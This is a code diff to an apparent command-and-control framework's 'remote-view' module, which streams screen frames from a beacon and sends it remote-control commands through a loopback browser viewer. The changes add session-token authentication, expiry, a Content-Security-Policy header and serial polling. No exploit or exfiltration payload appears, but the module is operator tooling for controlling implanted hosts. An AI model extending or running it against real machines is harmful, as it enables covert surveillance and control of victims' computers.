@@ -20,13 +20,21 @@ from __future__ import annotations
 
 import base64
 import json
+import secrets
 import threading
+import time
 import webbrowser
 from typing import Optional, Tuple
 
 from aiohttp import web
 
 from phantom.core.c2_server import c2_state
+
+# Session lifetime: the token the viewer serves with EXPIRES after this
+# many seconds (P0-5). `launch_viewer` re-issues on each invocation; a
+# long session keeps working because the browser page holds the token in
+# memory and the expiry is sliding (refreshed on authenticated use).
+_SESSION_TTL = 3600.0
 
 _HTML = """<!DOCTYPE html>
 <html>
@@ -87,12 +95,17 @@ _HTML = """<!DOCTYPE html>
 </div>
 <script>
 const BID = %BEACON_ID%;
+// session token arrives in the URL fragment (#t=...) — fragments are NOT
+// sent to the server in requests nor written to server logs.
+const TOKEN = (location.hash.match(/t=([A-Za-z0-9_-]+)/) || [])[1] || "";
 const $ = (id) => document.getElementById(id);
 let lastSeq = "", streaming = false, live = false, typing = "";
 
-async function api(method, endpoint, body) {
+async function api(method, endpoint, body, signal) {
   const r = await fetch(endpoint, {
-    method, headers: {"Content-Type": "application/json"},
+    method, signal,
+    headers: {"Content-Type": "application/json",
+              "Authorization": "Bearer " + TOKEN},
     body: body ? JSON.stringify(body) : undefined });
   return r.json();
 }
@@ -109,29 +122,52 @@ $("btn-stop").onclick  = () => { streaming = false; live = false;
   badge(); api("POST", "/send", { cmd: "remote stop" }); };
 $("btn-frame").onclick = () => api("POST", "/send", { cmd: "remote frame" });
 
+// abort an in-flight poll when the page is closed (P0-6 hygiene)
+window.addEventListener("beforeunload", () => { if (pollAbort) pollAbort.abort(); });
+
 function badge() {
   $("badge").style.display = streaming ? "block" : "none";
   $("badge").innerHTML = "<b>\\u25CF</b> " + (live ? "LIVE" : "STREAMING");
 }
 
-// ── frame polling (newest artifact) ─────────────────────────────────
+// ── frame polling (newest artifact) — SERIAL, never overlapping ──────
+// P0-6: one in-flight request at a time; the next poll is scheduled only
+// after the previous one finishes (backoff on error), so a slow server can
+// never stack requests. The interval adapts to the live/streaming mode.
 let t0 = performance.now(), frames = 0;
-setInterval(async () => {
-  const arts = await api("GET", "/frames");
-  const f = (arts.frames || [])[0];
-  if (!f) return;
-  if (f.name !== lastSeq) {
-    lastSeq = f.name;
-    $("frame").src = "/frame?name=" + encodeURIComponent(f.name) + "&t=" + Date.now();
-    $("empty").style.display = "none";
-    frames++;
-    const dt = (performance.now() - t0) / 1000;
-    if (dt > 2) { $("fps").textContent = (frames / dt).toFixed(1) + " fps"; }
-  }
-}, live ? 300 : 1200);
+let pollDelay = 1200, pollTimer = null, pollBusy = false, pollAbort = null;
 
-// keep poll interval in sync with live mode
-setInterval(() => {}, 60000);
+function schedulePoll() {
+  if (pollTimer) clearTimeout(pollTimer);
+  pollTimer = setTimeout(pollOnce, pollBusy ? 200 : pollDelay);
+}
+
+async function pollOnce() {
+  if (pollBusy) { schedulePoll(); return; }        // hard serial guard
+  pollBusy = true;
+  pollAbort = new AbortController();
+  try {
+    const arts = await api("GET", "/frames", null, pollAbort.signal);
+    const f = (arts.frames || [])[0];
+    if (f && f.name !== lastSeq) {
+      lastSeq = f.name;
+      $("frame").src = "/frame?name=" + encodeURIComponent(f.name) + "&t=" + Date.now()
+                       + (TOKEN ? "&tk=" + encodeURIComponent(TOKEN) : "");
+      $("empty").style.display = "none";
+      frames++;
+      const dt = (performance.now() - t0) / 1000;
+      if (dt > 2) { $("fps").textContent = (frames / dt).toFixed(1) + " fps"; }
+    }
+    pollDelay = live ? 300 : 1200;                 // honest re-read each cycle
+  } catch (e) {
+    pollDelay = Math.min((pollDelay || 1200) * 2, 8000);   // backoff on error
+  } finally {
+    pollBusy = false;
+    pollAbort = null;
+    schedulePoll();
+  }
+}
+schedulePoll();
 
 // ── input: the image IS the control surface ─────────────────────────
 const img = $("frame");
@@ -186,17 +222,43 @@ def _resolve_beacon(bid_prefix: str) -> Tuple[str, str]:
         {"error": f"ambiguous or unknown beacon '{bid_prefix}'"}))
 
 
-def make_app(beacon_id: str) -> web.Application:
+def make_app(beacon_id: str, session_token: str = "") -> web.Application:
     bid, _host = _resolve_beacon(beacon_id)
+    # P0-5: the viewer is loopback-only but loopback is NOT an auth boundary
+    # (any local process or page can reach it). Every route requires a
+    # bearer session token; `launch_viewer` generates it per-session and
+    # opens the browser with it in the URL fragment (never sent to logs).
+    if not session_token:
+        session_token = secrets.token_urlsafe(24)
+    _auth = {"token": session_token, "expires": time.time() + _SESSION_TTL}
     routes = web.RouteTableDef()
+
+    def _check(request: web.Request) -> Optional[web.Response]:
+        hdr = request.headers.get("Authorization", "")
+        token = hdr[7:] if hdr.startswith("Bearer ") else request.query.get("t", "")
+        if not token or not secrets.compare_digest(token, _auth["token"]):
+            return web.json_response({"error": "unauthorized"}, status=401)
+        if time.time() > _auth["expires"]:
+            return web.json_response({"error": "session expired — relaunch remote-view"},
+                                     status=401)
+        _auth["expires"] = time.time() + _SESSION_TTL   # sliding window
+        return None
 
     @routes.get("/")
     async def index(_request: web.Request) -> web.Response:
         html = _HTML.replace("%BEACON_ID%", bid)
-        return web.Response(text=html, content_type="text/html")
+        return web.Response(
+            text=html, content_type="text/html",
+            headers={"Content-Security-Policy":
+                     "default-src 'none'; img-src 'self' data:; "
+                     "script-src 'unsafe-inline'; style-src 'unsafe-inline'; "
+                     "connect-src 'self'; frame-ancestors 'none'; form-action 'self'"})
 
     @routes.get("/frames")
-    async def frames(_request: web.Request) -> web.Response:
+    async def frames(request: web.Request) -> web.Response:
+        denied = _check(request)
+        if denied:
+            return denied
         # newest frame artifacts for this beacon (data/remote/)
         from phantom.utils.paths import data_dir
         import os
@@ -211,6 +273,9 @@ def make_app(beacon_id: str) -> web.Application:
 
     @routes.get("/frame")
     async def frame(request: web.Request) -> web.Response:
+        denied = _check(request)
+        if denied:
+            return denied
         from phantom.utils.paths import data_dir
         import os
         name = os.path.basename(request.query.get("name", ""))
@@ -224,6 +289,9 @@ def make_app(beacon_id: str) -> web.Application:
 
     @routes.post("/send")
     async def send(request: web.Request) -> web.Response:
+        denied = _check(request)
+        if denied:
+            return denied
         body = await request.json() or {}
         cmd = str(body.get("cmd", "")).strip()
         if not cmd:
@@ -237,11 +305,14 @@ def make_app(beacon_id: str) -> web.Application:
 
 
 def launch_viewer(beacon_id: str, open_browser: bool = True,
-                  timeout: Optional[float] = None) -> Tuple[int, threading.Thread]:
+                  timeout: Optional[float] = None) -> Tuple[int, threading.Thread, str]:
     """Serve the viewer on 127.0.0.1:<random free port> and optionally open
-    the browser. Returns (port, server_thread). The caller decides when to
-    shut the thread down (daemon thread: dies with the process)."""
-    app = make_app(beacon_id)
+    the browser. Returns (port, server_thread, session_token). The caller
+    decides when to shut the thread down (daemon thread: dies with the
+    process). The session token is required by every route (P0-5) and is
+    handed to the browser in the URL fragment."""
+    session_token = secrets.token_urlsafe(24)
+    app = make_app(beacon_id, session_token=session_token)
     runner = web.AppRunner(app)
     loop_holder = {}
 
@@ -271,5 +342,5 @@ def launch_viewer(beacon_id: str, open_browser: bool = True,
         time.sleep(0.1)
     port = loop_holder.get("port", 0)
     if open_browser and port:
-        webbrowser.open(f"http://127.0.0.1:{port}/")
-    return port, t
+        webbrowser.open(f"http://127.0.0.1:{port}/#t={session_token}")
+    return port, t, session_token
